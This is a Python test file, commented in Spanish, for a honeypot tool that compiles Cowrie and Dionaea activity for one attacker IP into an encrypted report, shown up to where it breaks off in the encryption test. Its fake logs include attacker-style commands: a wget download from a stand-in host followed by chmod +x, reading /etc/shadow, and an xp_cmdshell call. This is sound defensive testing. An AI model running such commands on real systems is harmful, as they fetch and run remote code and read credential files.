#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
test_que_hizo_esta_ip.py --- la ficha de una IP: que salga completa, que no
meta dentro a nadie mas, y que el tar salga CIFRADO de verdad.

    python3 "3.6 Para facilitarnos la vida/tests/test_que_hizo_esta_ip.py"

Se monta un senuelo de mentira ---dos logs de Cowrie con dos IPs distintas y
una linea rota, una base de Dionaea, la del reporter, binarios de pega y un
`nft` falso--- porque las capturas de verdad no se pueden subir al repositorio.
Es lo mismo que hace test_analisis.py y por el mismo motivo.

LO QUE MAS IMPORTA AQUI son tres cosas, y ninguna se ve leyendo el codigo:

  1. QUE NO SE CUELE NADIE MAS. Una ficha que mezcla dos atacantes no es un
     error de formato: es una denuncia mal hecha. Se comprueba con una segunda
     IP en el mismo log, con una IP parecida en la base del reporter
     ---198.51.100.234 contra 198.51.100.23, que el LIKE de SQL casa--- y con una
     conexion de otra IP en Dionaea.

  2. QUE LA HORA ESTE CORREGIDA. Cowrie firma con "Z" y escribe hora de Kyiv.
     La funcion se compara con la del recolector del reporter: si alguien toca
     una y no la otra, esto se pone rojo.

  3. QUE EL TAR NO SE PUEDA ABRIR SIN LA CLAVE, y que no quede un .tar.gz en
     claro en el disco. Todo el motivo de cifrarlo ---que Defender no ponga las
     muestras en cuarentena al bajarlas--- se cae si el tar sale legible o si
     por el camino se escribe uno sin cifrar.

NECESITA openssl, que es quien cifra. En la VPS esta; en un equipo recien
formateado puede no estar, y entonces esta suite no puede probar lo que importa
y sale en ROJO a proposito, igual que las dos que necesitan sqlite3.
"""

from __future__ import annotations

import gzip
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tarfile
import tempfile
from datetime import datetime, timedelta, timezone

AQUI = os.path.dirname(os.path.abspath(__file__))
CARPETA = os.path.dirname(AQUI)
RAIZ = os.path.dirname(CARPETA)
HERRAMIENTA = os.path.join(CARPETA, "que_hizo_esta_ip.py")

OK = 0
MAL = 0


def comprueba(que, esperado, obtenido):
    global OK, MAL
    if esperado == obtenido:
        OK += 1
        print("  ok    %s" % que)
    else:
        MAL += 1
        print("  FALLO %s\n          esperaba <%s>\n          obtuvo   <%s>"
              % (que, esperado, obtenido))


def cierto(que, condicion):
    comprueba(que, True, bool(condicion))


# ---------------------------------------------------------------------------
# El senuelo de mentira.
# ---------------------------------------------------------------------------
IP = "198.51.100.23"
OTRA_IP = "203.0.113.200"
IP6 = "2001:db8::dead:1"

TMP = tempfile.mkdtemp(prefix="ficha-")
LOG = os.path.join(TMP, "log")
DESCARGAS = os.path.join(TMP, "lib", "downloads")
TTY = os.path.join(TMP, "lib", "tty")
BINARIOS = os.path.join(TMP, "dionaea-bin")
CASA = os.path.join(TMP, "home")
for _d in (LOG, DESCARGAS, TTY, BINARIOS, CASA):
    os.makedirs(_d)

MUESTRA = b"\x7fELF" + b"esto no es malware, es una prueba" * 30
SHA = hashlib.sha256(MUESTRA).hexdigest()
with open(os.path.join(DESCARGAS, SHA), "wb") as _fh:
    _fh.write(MUESTRA)

# El binario de Dionaea se guarda con su nombre de fichero y su fila trae SOLO
# el md5: es el caso que el recolector no acertaba cuando daba por hecho el
# nombre. Aqui tiene que atarse igual, y ademas publicar el sha256 del FICHERO.
DE_SMB = b"MZ" + b"binario que llego por SMB" * 12
SHA_SMB = hashlib.sha256(DE_SMB).hexdigest()
MD5_SMB = hashlib.md5(DE_SMB).hexdigest()
with open(os.path.join(BINARIOS, SHA_SMB), "wb") as _fh:
    _fh.write(DE_SMB)

GRABACION = "20260928-041102-abc123-01e.log"
with open(os.path.join(TTY, GRABACION), "wb") as _fh:
    _fh.write(b"\x00\x01una grabacion de mentira")


# Una grabacion que existe pero no tiene nada dentro. En el log real venian
# cuatro sesiones de telnet asi, y las cuatro se anunciaban como un hallazgo.
VACIA = "20260928-094600-dur001-01e.log"
open(os.path.join(TTY, VACIA), "wb").close()

# El sha256 de un fichero vacio, que es con lo que Cowrie firma esas
# grabaciones. Se comprueba con: printf "" | sha256sum
SHA_VACIO = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


def ev(ts, eid, **kw):
    d = {"eventid": eid, "timestamp": ts, "sensor": "pc-dev-003-ignis"}
    d.update(kw)
    return json.dumps(d)


# Las marcas llevan "Z" y son hora de Kyiv: en UTC de verdad son tres horas
# menos. 07:11Z de Cowrie = 04:11 UTC.
LINEAS = [
    ev("2026-09-28T07:11:02.100000Z", "cowrie.session.connect", src_ip=IP,
       src_port=51234, dst_port=2222, protocol="ssh", session="abc123"),
    ev("2026-09-28T07:11:02.400000Z", "cowrie.client.version", src_ip=IP,
       session="abc123", version="SSH-2.0-libssh2_1.9.0"),
    ev("2026-09-28T07:11:03.000000Z", "cowrie.login.failed", src_ip=IP,
       session="abc123", username="root", password="123456"),
    ev("2026-09-28T07:11:04.000000Z", "cowrie.login.success", src_ip=IP,
       session="abc123", username="root", password="3245gs5662d34"),
    ev("2026-09-28T07:11:07.000000Z", "cowrie.command.input", src_ip=IP,
       session="abc123", input="uname -a; cat /proc/cpuinfo"),
    ev("2026-09-28T07:11:11.000000Z", "cowrie.session.file_download", src_ip=IP,
       session="abc123", url="http://1.2.3.4/bins/x86", shasum=SHA),
    # Una descarga cuyo binario YA NO esta en el disco: la ficha tiene que
    # decirlo, no callarlo.
    ev("2026-09-28T07:11:12.000000Z", "cowrie.session.file_download", src_ip=IP,
       session="abc123", url="http://1.2.3.4/bins/mips", shasum="f" * 64),
    # Este evento NO lleva src_ip, solo la sesion: es el que dice donde quedo
    # la grabacion del terminal. Sin la primera pasada se perderia.
    ev("2026-09-28T07:12:30.000000Z", "cowrie.log.closed", session="abc123",
       ttylog="var/lib/cowrie/tty/" + GRABACION, size=871),
    ev("2026-09-28T09:40:00.000000Z", "cowrie.session.connect", src_ip=IP,
       src_port=51299, dst_port=2223, protocol="telnet", session="def456"),
    # Una orden de VARIAS LINEAS, que es lo que deja un `python3 -c` pegado de
    # golpe: en SOLO COMANDOS tiene que salir entera y sin sangria, para poder
    # copiarla tal cual.
    ev("2026-09-28T09:40:05.000000Z", "cowrie.command.input", src_ip=IP,
       session="def456",
       input="wget http://1.2.3.4/x -O /tmp/x\nchmod +x /tmp/x"),
    # Esta sesion se cierra con el campo VIEJO, para que las dos formas de decir
    # la duracion queden probadas.
    ev("2026-09-28T09:41:30.000000Z", "cowrie.session.closed", src_ip=IP,
       session="def456", duration=89.3),
    # La otra IP, que no debe aparecer en la ficha por ningun lado.
    ev("2026-09-28T09:41:00.000000Z", "cowrie.session.connect", src_ip=OTRA_IP,
       src_port=4000, dst_port=2222, protocol="ssh", session="zzz999"),
    ev("2026-09-28T09:41:02.000000Z", "cowrie.command.input", src_ip=OTRA_IP,
       session="zzz999", input="echo esto no tiene que salir"),
    # Una linea rota en medio: lo de despues tiene que leerse igual.
    "{esto no es json",
    ev("2026-09-28T09:42:00.000000Z", "cowrie.command.input", src_ip=IP,
       session="def456", input="cat /etc/shadow"),
    # Una sesion que trae duration_ms, que es el campo de VERDAD de este Cowrie:
    # antes se pedia "duration" y salia "duracion ? s" en todas las sesiones.
    ev("2026-09-28T09:45:00.000000Z", "cowrie.session.connect", src_ip=IP,
       src_port=51300, dst_port=2222, protocol="ssh", session="dur001"),
    ev("2026-09-28T09:45:02.500000Z", "cowrie.session.closed", src_ip=IP,
       session="dur001", duration_ms=2500),
    # LO QUE TECLEA UN ATACANTE NO ES TEXTO: manda bytes, y ahi caben escapes de
    # terminal y trozos que no forman ningun caracter. Cowrie escribe su JSON en
    # ASCII, asi que lo que no pudo decodificar llega como \ufffd y un ESC como
    # \u001b. En el .txt salian como rombos negros, y entonces no se sabia si el
    # rombo lo escribio el atacante o lo puso el editor por no saber pintarlo.
    ev("2026-09-28T09:47:00.000000Z", "cowrie.command.input", src_ip=IP,
       session="dur001",
       input="echo \ufffd$h:\ufffdp OPEN\ufffd; printf '\u001b[31m'; "
             "echo ni\u00f1o"),
    # Y una grabacion que NO grabo nada.
    ev("2026-09-28T09:46:00.000000Z", "cowrie.log.closed", session="dur001",
       ttylog="var/lib/cowrie/tty/" + VACIA, size=315, shasum=SHA_VACIO),
    # Y una IPv6, para el nombre del fichero y el conjunto ban6.
    ev("2026-09-28T09:50:00.000000Z", "cowrie.session.connect", src_ip=IP6,
       src_port=6000, dst_port=2222, protocol="ssh", session="ip6001"),
]
with open(os.path.join(LOG, "cowrie.json"), "w", encoding="utf-8") as _fh:
    _fh.write("\n".join(LINEAS) + "\n")

# Un log rotado y comprimido: tambien se lee.
with gzip.open(os.path.join(LOG, "cowrie.json.2026-09-24.gz"), "wt",
               encoding="utf-8") as _fh:
    _fh.write(ev("2026-09-24T06:00:00.000000Z", "cowrie.session.connect",
                 src_ip=IP, src_port=3000, dst_port=2222, protocol="ssh",
                 session="old001") + "\n")

# --- Dionaea. Las marcas son epoch de verdad, asi que se ponen relativas a
#     ahora: con fechas fijas, el dia que se pruebe --dias no cuadraria nada.
AYER = int((datetime.now(timezone.utc) - timedelta(hours=20)).timestamp())
DIONAEA = os.path.join(TMP, "dionaea.sqlite")
_db = sqlite3.connect(DIONAEA)
_db.executescript("""
CREATE TABLE connections (connection INTEGER PRIMARY KEY, connection_type TEXT,
  connection_protocol TEXT, connection_timestamp INTEGER, local_host TEXT,
  local_port INTEGER, remote_host TEXT, remote_port INTEGER);
CREATE TABLE downloads (download INTEGER PRIMARY KEY, connection INTEGER,
  download_url TEXT, download_md5_hash TEXT, download_sha512_hash TEXT);
CREATE TABLE mssql_commands (id INTEGER PRIMARY KEY, connection INTEGER,
  cmd TEXT);
""")
# 1: anotada como "::ffff:" (hay versiones que lo hacen) --- cuenta.
# 2: la misma IP en el 1433 --- cuenta, y trae un comando MSSQL.
# 3: un 'reject', que no llego a establecerse --- NO cuenta.
# 4: otra IP --- NO cuenta.
_db.execute("INSERT INTO connections VALUES (1,'accept','smbd',?, '10.0.0.1',"
            "445,?,49111)", (AYER, "::ffff:" + IP))
_db.execute("INSERT INTO connections VALUES (2,'accept','mssqld',?, '10.0.0.1',"
            "1433,?,49112)", (AYER + 60, IP))
_db.execute("INSERT INTO connections VALUES (3,'reject','smbd',?, '10.0.0.1',"
            "445,?,49113)", (AYER + 120, IP))
_db.execute("INSERT INTO connections VALUES (4,'accept','smbd',?, '10.0.0.1',"
            "445,'198.51.100.7',49114)", (AYER + 180,))
_db.execute("INSERT INTO downloads VALUES (1,1,'',?,'')", (MD5_SMB,))
_db.execute("INSERT INTO mssql_commands VALUES (1,2,'EXEC xp_cmdshell ''dir''')")
_db.commit()
_db.close()

# --- la base del reporter.
ESTADO = os.path.join(TMP, "state.sqlite3")
_db = sqlite3.connect(ESTADO)
_db.executescript("""
CREATE TABLE sent (platform TEXT, key TEXT, status TEXT, sent_at TEXT,
  detail TEXT);
CREATE TABLE rejections (id INTEGER PRIMARY KEY, ts TEXT, platform TEXT,
  gate TEXT, key TEXT, reason TEXT);
CREATE TABLE samples (sha256 TEXT PRIMARY KEY, state TEXT, family TEXT,
  vt_malicious INTEGER);
""")
_db.execute("INSERT INTO sent VALUES ('abuseipdb',?,'ok','2026-09-28T08:00:00',"
            "'categorias 18,22')", (IP + "@2026-09-28",))
# LA TRAMPA: esta clave contiene la IP como subcadena y el LIKE de SQL la casa.
# Si sale en la ficha, la ficha esta contando denuncias de otra maquina.
_db.execute("INSERT INTO sent VALUES ('abuseipdb',?,'ok','2026-09-28T08:00:00',"
            "'ESTA ES DE OTRA IP')", ("198.51.100.234@2026-09-28",))
_db.execute("INSERT INTO rejections VALUES (1,'2026-09-28T08:15:00',"
            "'abuseipdb','enfriamiento',?,'ya se denuncio hace menos de 24 h')",
            (IP + "@2026-09-28",))
_db.execute("INSERT INTO samples VALUES (?,'publicada','mirai',54)", (SHA,))
_db.commit()
_db.close()

CFG = os.path.join(TMP, "config.ini")
with open(CFG, "w", encoding="utf-8") as _fh:
    _fh.write("""[general]
state_db = %s

[paths]
cowrie_log_dir  = %s
cowrie_log_glob = cowrie.json*
downloads_dir   = %s
cowrie_log_tz   = Europe/Kyiv
cowrie_puertos_publicos = 2222:22, 2223:23
dionaea_sqlite   = %s
dionaea_binaries = %s

[blocklist]
ips   = 198.51.100.7
cidrs =
""" % (ESTADO, LOG, DESCARGAS, DIONAEA, BINARIOS))


# --- el `nft` de mentira. Uno que contesta lo que le digan y otro que falla.
#
# Dos ficheros y no un doble en Python porque la herramienta lo llama como un
# programa: probar con un `subprocess.run` sustituido seria probar el
# sustituto. Y en Windows ---donde tambien se corre la suite--- un guion de
# shell no se puede ejecutar, asi que se escribe un .cmd.
def fake(nombre: str, cuerpo_sh: str, cuerpo_cmd: str) -> str:
    if os.name == "nt":
        ruta = os.path.join(TMP, nombre + ".cmd")
        with open(ruta, "w") as fh:
            fh.write(cuerpo_cmd)
    else:
        ruta = os.path.join(TMP, nombre + ".sh")
        with open(ruta, "w") as fh:
            fh.write(cuerpo_sh)
        os.chmod(ruta, 0o755)
    return ruta


NFT_BUENO = fake("nft", '#!/bin/sh\ncat "$NFT_FICHERO"\n',
                 '@echo off\r\ntype "%NFT_FICHERO%"\r\n')
NFT_ROTO = fake("nft-roto", "#!/bin/sh\nexit 1\n", "@echo off\r\nexit /b 1\r\n")

# La forma REAL de un `nft list set`: elementos separados por comas, repartidos
# en varias lineas y con su comentario detras. La IPv6 va escrita sin comprimir
# a proposito: el kernel no tiene por que escribirla como se tecleo.
SET_BAN4 = os.path.join(TMP, "ban4.txt")
with open(SET_BAN4, "w", encoding="utf-8") as _fh:
    _fh.write("""table inet dirtyland {
\tset ban4 {
\t\ttype ipv4_addr
\t\telements = { 198.51.100.23 comment "IP BANEADA COWRIE AUTOMATICO",
\t\t\t     198.51.100.7 comment "IP BANEADA COWRIE MANUAL DESDE TELEGRAM" }
\t}
}
""")
SET_BAN6 = os.path.join(TMP, "ban6.txt")
with open(SET_BAN6, "w", encoding="utf-8") as _fh:
    _fh.write("""table inet dirtyland {
\tset ban6 {
\t\ttype ipv6_addr
\t\telements = { 2001:db8:0:0:0:0:dead:1 comment "IP BANEADA COWRIE AUTOMATICO" }
\t}
}
""")


# ---------------------------------------------------------------------------
# Lanzar la herramienta.
# ---------------------------------------------------------------------------
def correr(*args, salida=None, nft=None, fichero_nft=None, responde=None):
    """main() con el entorno puesto. Devuelve (codigo, lo que imprimio).

    `responde` es lo que se teclea en las preguntas. Sin nada que leer, la
    herramienta se queda con el valor por defecto de cada una, que es lo que le
    pasa a un cron.
    """
    os.environ["DIRTYLAND_CFG"] = CFG
    os.environ["DIRTYLAND_SALIDA"] = salida or CASA
    os.environ["DIRTYLAND_NFT"] = nft or os.path.join(TMP, "no-hay-nft")
    os.environ["DIRTYLAND_GEOIP"] = os.path.join(TMP, "no-hay-geoip")
    os.environ["NFT_FICHERO"] = fichero_nft or ""
    # Se recarga en cada llamada porque las rutas del entorno se leen al
    # importar, igual que en test_voy_al_dia.py.
    spec = importlib.util.spec_from_file_location("ficha_ip", HERRAMIENTA)
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    antes, sys.argv = sys.argv, ["que_hizo_esta_ip.py", *args]
    buf = io.StringIO()
    # EL stdin SE SUSTITUYE SIEMPRE, con respuesta o sin ella. Dejando el del
    # entorno, un input() sin nada que leer no siempre da EOF: segun quien haya
    # lanzado la suite se queda esperando para siempre, y entonces se cuelga
    # entera sin decir por que. Paso al escribir estas pruebas.
    real_in = sys.stdin
    sys.stdin = io.StringIO(responde or "")
    real_out, real_err = sys.stdout, sys.stderr
    # Tambien el stderr: los avisos de la herramienta saldrian por encima de
    # los resultados de esta suite y pareceria que algo ha fallado aqui.
    sys.stdout = sys.stderr = buf
    try:
        codigo = modulo.main()
    finally:
        sys.stdout, sys.stderr = real_out, real_err
        sys.stdin = real_in
        sys.argv = antes
    return codigo, buf.getvalue()


def la_ficha(carpeta=None, patron="ficha-198.51.100.23-*.txt"):
    import glob
    ficheros = sorted(glob.glob(os.path.join(carpeta or CASA, patron)))
    return ficheros[-1] if ficheros else None


try:
    # =====================================================================
    print()
    print("La hora de Cowrie, contra la funcion del recolector")
    # Se EXTRAE del fichero del reporter en vez de copiarla aqui: importarlo
    # arrastraria el paquete entero (common.log, common.model...) y copiar la
    # funcion seria probar la copia. Misma tecnica que test_analisis.py.
    fuente = os.path.join(RAIZ, "REPORTING PLATFORM SCRIPTS", "collectors",
                          "cowrie.py")
    suya = None
    try:
        codigo_col = io.open(fuente, encoding="utf-8").read()
        trozo = re.search(r"^_CON_HUSO = .*?^def parse_timestamp.*?(?=^def )",
                          codigo_col, re.M | re.S)
        ns = {"datetime": datetime, "timezone": timezone, "re": re}
        exec(compile(trozo.group(0), fuente, "exec"), ns)  # noqa: S102
        suya = ns["parse_timestamp"]
    except Exception as exc:                               # noqa: BLE001
        print("  (no se pudo extraer la del recolector: %s)" % exc)

    spec = importlib.util.spec_from_file_location("ficha_mod", HERRAMIENTA)
    herramienta = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(herramienta)

    from zoneinfo import ZoneInfo
    kyiv = ZoneInfo("Europe/Kyiv")
    casos = [
        "2026-09-28T07:11:02Z",        # la "Z" mentirosa: es hora de Kyiv
        "2026-09-28T07:11:02",        # sin huso: igual
        "2026-09-28T07:11:02+03:00",  # desfase explicito: ese no miente
        "2026-01-15T23:59:59Z",       # invierno, que el desfase cambia
        "no es una fecha",
        "",
    ]
    if suya:
        comprueba("da lo MISMO que la del recolector", [],
                  [c for c in casos
                   if herramienta.parse_timestamp(c, kyiv) != suya(c, kyiv)])
    comprueba("la 'Z' de Cowrie se reinterpreta como hora local",
              "2026-09-28 04:11",
              herramienta.parse_timestamp(casos[0], kyiv)
              .strftime("%Y-%m-%d %H:%M"))
    comprueba("un desfase explicito se respeta tal cual", "2026-09-28 04:11",
              herramienta.parse_timestamp(casos[2], kyiv)
              .strftime("%Y-%m-%d %H:%M"))
    comprueba("una marca ilegible no revienta: devuelve nada", None,
              herramienta.parse_timestamp("no es una fecha", kyiv))

    # =====================================================================
    print()
    print("La barra, que es lo que dice que no se ha colgado")
    # Entre teclear la IP y ver el resultado hay dos pasadas sobre cientos de
    # megas de JSON. Lo que se prueba aqui no es que la barra sea bonita: es que
    # se mueva, que llegue al final, y que NO se pinte cuando la salida no es un
    # terminal ---en un fichero de log, un "\\r" deja una linea ilegible de miles
    # de caracteres---.
    def pinta_con(activa, pasos=(30, 30, 30)):
        b = herramienta.Barra(100, activa=activa)
        buf, real = io.StringIO(), sys.stdout
        sys.stdout = buf
        try:
            b.etapa("leyendo")
            for n in pasos:
                b._ultimo = 0.0          # sin el freno de los 100 ms
                b.avanza(n)
            b.cierra("hecho")
        finally:
            sys.stdout = real
        return b, buf.getvalue()

    b, salida = pinta_con(True)
    cierto("en un terminal pinta la barra y su porcentaje",
           "[" in salida and "%" in salida and "#" in salida)
    cierto("y se mueve: hay mas de un fotograma", salida.count("\r") > 2)
    comprueba("al cerrarla queda al 100", b.total, b.hecho)
    cierto("y el ultimo fotograma dice 100%", "100%" in salida)

    # activa=False: aqui se mira la cuenta, no lo que pinta ---y con activa
    # pintaria un fotograma en medio de los resultados de esta suite---.
    b2 = herramienta.Barra(100, activa=False)
    b2.avanza(500)
    comprueba("no pasa del total aunque se le pida de mas", b2.total, b2.hecho)

    _b3, sin_terminal = pinta_con(False)
    comprueba("sin terminal NO pinta ninguna barra", False,
              "\r" in sin_terminal or "[#" in sin_terminal)
    cierto("pero dice en que etapa va", "leyendo" in sin_terminal)

    # EL TRUCO DEL .GZ: los cuatro ultimos bytes de un gzip son el tamano
    # original. Sin eso, la barra pesaria los logs rotados por su tamano
    # COMPRIMIDO y se quedaria clavada en cada uno mientras lee cinco veces mas
    # de lo que creia.
    crudo = b"x" * 50000
    gz = os.path.join(TMP, "medir.gz")
    with gzip.open(gz, "wb") as fh:
        fh.write(crudo)
    comprueba("de un .gz se mide lo DESCOMPRIMIDO", len(crudo),
              herramienta.peso_de_log(gz))
    cierto("y eso es mucho mas que lo que ocupa en disco",
           herramienta.peso_de_log(gz) > os.path.getsize(gz) * 5)
    llano = os.path.join(TMP, "medir.txt")
    with open(llano, "wb") as fh:
        fh.write(crudo)
    comprueba("y de un fichero normal, lo que ocupa", len(crudo),
              herramienta.peso_de_log(llano))
    comprueba("un fichero que no esta no rompe la cuenta", 0,
              herramienta.peso_de_log(os.path.join(TMP, "no-existe")))
    comprueba("los tamanos se escriben en unidades legibles", "3.6 KB",
              herramienta.tamano_legible(3700))

    # =====================================================================
    print()
    print("La ficha")
    codigo, pantalla = correr(IP, nft=NFT_BUENO, fichero_nft=SET_BAN4)
    comprueba("sale bien", 0, codigo)
    ruta = la_ficha()
    cierto("deja el fichero en el home", ruta is not None)
    texto = io.open(ruta, encoding="utf-8").read() if ruta else ""

    cierto("trae lo que teclearon", "uname -a; cat /proc/cpuinfo" in texto)
    cierto("y lo que teclearon despues de la linea rota del log",
           "cat /etc/shadow" in texto)
    comprueba("NO se cuela la otra IP", False,
              OTRA_IP in texto or "esto no tiene que salir" in texto)
    cierto("la hora esta corregida (04:11, no 07:11)",
           "[2026-09-28 04:11:02]" in texto and "07:11:02" not in texto)
    cierto("el puerto es el publico y no el interno",
           "al puerto 22 " in texto and "2222" not in texto)
    cierto("el telnet sale en el 23", "al puerto 23 " in texto)
    cierto("la pareja que le funciono sale",
           "root / 3245gs5662d34" in texto)
    cierto("un binario que ya no esta en el disco se dice",
           "YA NO ESTA" in texto)
    cierto("la grabacion del terminal se encuentra por la sesion, sin IP",
           GRABACION in texto)
    cierto("dice que esta baneada y con el comentario del baneo",
           "IP BANEADA COWRIE AUTOMATICO" in texto)

    # Lo que el README ya no cuenta, lo cuenta el guion: se presenta al
    # arrancar y al terminar deja escrita la orden para llevarlo al anfitrion.
    # Se prueban porque son la documentacion de la herramienta ahora, no un
    # adorno de la pantalla.
    cierto("se presenta al arrancar, diciendo que hace",
           "la ficha de UNA IP" in pantalla and "HORA POR HORA" in pantalla)
    cierto("y avisa en la presentacion de que solo lee",
           "no ejecuta ninguna muestra" in pantalla)
    # LOS DOS FICHEROS EN UNA SOLA ORDEN. La ficha sin el tar deja el log sin las
    # muestras de las que habla, y el tar sin la ficha deja los binarios sin lo
    # que explica de donde salieron. Y el comodin ENTRE COMILLAS: sin ellas lo
    # expande el shell de tu equipo, donde ese fichero no existe.
    cierto("y da UNA orden que se trae la ficha y el tar juntos",
           re.search(r"scp 'dirtyland:\S+ficha-[^']+\.\*' \.", pantalla)
           is not None)
    cierto("y el shred que los borra de la VPS tambien va por los dos",
           re.search(r"shred -u \S+ficha-\S+\.\*", pantalla) is not None)

    print()
    print("Las dos partes: SOLO COMANDOS primero, TODO EL LOG detras")
    # La razon de que existan dos partes: de una sesion de veinte minutos, lo
    # que dice que buscaba el atacante son las diez lineas que escribio. Si esas
    # diez hay que encontrarlas entre la negociacion de telnet y las variables
    # del cliente, no se leen: se cierra el fichero.
    i_solo, i_todo = texto.find("SOLO COMANDOS"), texto.find("TODO EL LOG")
    cierto("estan las dos partes", i_solo > 0 and i_todo > 0)
    comprueba("y los comandos van PRIMERO", True, i_solo < i_todo)
    solo = texto[i_solo:i_todo]
    cierto("trae las ordenes tal cual se teclearon",
           "uname -a; cat /proc/cpuinfo" in solo)
    cierto("y una de varias lineas entera", "chmod +x /tmp/x" in solo)
    comprueba("y NADA mas: ni sesiones, ni logins, ni protocolo", [],
              [x for x in ("SESION ABIERTA", "LOGIN", "hassh", "GRABACION",
                           "DIONAEA", "cowrie.", "CLIENTE") if x in solo])
    # Cowrie apunta la misma linea dos veces cuando no sabe ejecutarla: una como
    # tecleada y otra como fallida. En SOLO COMANDOS solo va la tecleada.
    comprueba("ni la orden que el senuelo no supo ejecutar, que la repetiria",
              False, "NO SUPO" in solo)

    print()
    print("Y se pregunta, no se pasa por parametro")
    solo_dir = os.path.join(TMP, "solo")
    os.makedirs(solo_dir)
    # TRES PREGUNTAS Y EN ESTE ORDEN: la ventana, el log entero y el tar. El
    # primer Enter contesta "todo el log que haya" a la ventana.
    codigo, pantalla = correr(IP, salida=solo_dir, responde="\nn\n")
    comprueba("contestando n sale bien", 0, codigo)
    t_solo = io.open(la_ficha(solo_dir), encoding="utf-8").read()
    cierto("la ficha trae los comandos", "SOLO COMANDOS" in t_solo)
    comprueba("y NO trae el log entero", False, "TODO EL LOG" in t_solo)
    cierto("y la cabecera lo dice, para que no parezca que falta algo",
           "SOLO los comandos" in t_solo)
    cierto("la pregunta se ve en pantalla", "TODO EL LOG" in pantalla)

    for respuesta in ("s\n", "S\n", "y\n", "Y\n", "yes\n", "si\n", "\n", ""):
        dos = os.path.join(TMP, "dos-%d" % len(os.listdir(TMP)))
        os.makedirs(dos)
        correr(IP, salida=dos, responde="\n" + respuesta)
        cierto("con %r salen las dos partes" % respuesta,
               "TODO EL LOG" in io.open(la_ficha(dos), encoding="utf-8").read())
    for respuesta in ("n\n", "N\n", "no\n"):
        una = os.path.join(TMP, "una-%d" % len(os.listdir(TMP)))
        os.makedirs(una)
        correr(IP, salida=una, responde="\n" + respuesta)
        comprueba("con %r solo los comandos" % respuesta, False,
                  "TODO EL LOG" in io.open(la_ficha(una),
                                           encoding="utf-8").read())
    lio = os.path.join(TMP, "lio")
    os.makedirs(lio)
    codigo, pantalla = correr(IP, salida=lio, responde="\nquiza\nn\n")
    cierto("una respuesta que no es ni si ni no se vuelve a preguntar",
           "contesta s o n" in pantalla)
    comprueba("y luego hace lo que se le diga", False,
              "TODO EL LOG" in io.open(la_ficha(lio), encoding="utf-8").read())

    print()
    print("Lo que salia mal en el log de verdad")
    cierto("la duracion sale en segundos, del campo duration_ms",
           "duro 2.5 s" in texto)
    cierto("y tambien si viniera en el campo viejo", "duro 89.3 s" in texto)
    comprueba("ya no sale ninguna 'duracion ? s'", False, "duracion ?" in texto)
    cierto("una grabacion sin contenido se dice, no se anuncia como hallazgo",
           "no grabo nada" in texto)
    # El tamano se mide del fichero, no se copia del evento: el log de verdad
    # traia grabaciones "de 315 bytes" que no tenian nada dentro.
    cierto("y la que si tiene algo dice lo que pesa EN EL DISCO",
           "(%d bytes, va en el tar cifrado)"
           % os.path.getsize(os.path.join(TTY, GRABACION)) in texto)

    print()
    print("Lo que no es texto, escrito de forma que se pueda leer")
    # LA FICHA ENTERA TIENE QUE SER ASCII. Se abre en un Notepad de Windows, en
    # un `less` de la VPS y en lo que haya, y ninguno puede estropearla ni hacer
    # dudar de lo que vio el senuelo. Lo de fuera del ASCII se escribe marcado.
    comprueba("la ficha entera es ASCII, sin una sola excepcion", True,
              texto.isascii())
    cierto("lo que Cowrie no pudo decodificar sale como <?>",
           "echo <?>$h:<?>p OPEN<?>" in texto)
    cierto("un escape de terminal, como lo ensena cat -v", "^[[31m" in texto)
    cierto("y cualquier otro caracter, con su numero",
           "echo ni<U+00F1>o" in texto)

    plano = herramienta.texto_plano
    comprueba("un byte crudo del log se escribe con su valor", "abc\\xe2",
              plano("abc\udce2"))
    comprueba("el nulo tambien se ve", "^@", plano("\x00"))
    comprueba("y lo normal no se toca", "ls -la /tmp\tx",
              plano("ls -la /tmp\tx"))
    comprueba("la bandera se va y el pais se queda", "Paises Bajos",
              herramienta.sin_banderas("\U0001F1F3\U0001F1F1 Paises Bajos"))

    print()
    print("Cada evento, bajo el bloque de SU hora")
    # Un bloque por hora es TODO lo que hace esta herramienta legible: si un
    # evento cae en el bloque de otra hora, las horas de la cabecera y las de
    # las lineas dicen cosas distintas y no hay forma de saber cual creer.
    bloque, fuera_de_sitio, bloques = None, [], []
    for linea in texto.splitlines():
        cabecera = re.match(r"^\[(\d{4}-\d\d-\d\d \d\d):00 UTC\]", linea)
        if cabecera:
            bloque = cabecera.group(1)
            bloques.append(bloque)
            continue
        evento = re.match(r"^\[(\d{4}-\d\d-\d\d \d\d):\d\d:\d\d\]", linea)
        if evento and bloque and evento.group(1) != bloque:
            fuera_de_sitio.append(linea)
    comprueba("ningun evento cae en el bloque de otra hora", [],
              fuera_de_sitio)
    cierto("hay mas de un bloque", len(bloques) > 1)
    comprueba("y van en orden de tiempo", sorted(bloques), bloques)
    comprueba("sin bloques repetidos", len(set(bloques)), len(bloques))
    comprueba("ninguna linea acaba en espacios", [],
              [n for n, l in enumerate(texto.splitlines(), 1)
               if l != l.rstrip()])

    print()
    print("Dionaea, que es la otra mitad del senuelo")
    cierto("la conexion anotada como ::ffff: cuenta igual",
           "puerto 445" in texto)
    cierto("el comando de MSSQL sale", "xp_cmdshell" in texto)
    comprueba("un 'reject' no cuenta como conexion", 1,
              texto.count("puerto 445   smbd"))
    comprueba("la conexion de otra IP no cuenta", False, "198.51.100.7" in texto)
    cierto("el binario de SMB se ata por su md5 aunque el fichero se llame "
           "por el sha256", SHA_SMB in texto)
    cierto("y de el se publica el sha256 del FICHERO, no el md5 de su fila",
           re.search(r"dionaea\s+%s" % SHA_SMB, texto) is not None
           and MD5_SMB not in texto)
    # El hash entero, porque recortado no vale para buscar la muestra.
    cierto("el sha256 de lo capturado sale completo, no a medias",
           SHA in texto)

    print()
    print("Lo que se publico de esa IP")
    cierto("sale la denuncia de AbuseIPDB", "abuseipdb" in texto)
    comprueba("y NO la de una IP que solo se parece", False,
              "ESTA ES DE OTRA IP" in texto)
    cierto("sale el descarte con su motivo", "enfriamiento" in texto)
    cierto("y el estado de su muestra", "mirai" in texto)

    # =====================================================================
    print()
    print("El tar de los hallazgos")
    if not shutil.which("openssl"):
        comprueba("hace falta openssl para probar el cifrado (apt install "
                  "openssl)", True, False)
    else:
        tars = [f for f in os.listdir(CASA) if f.endswith(".tar.gz.enc")]
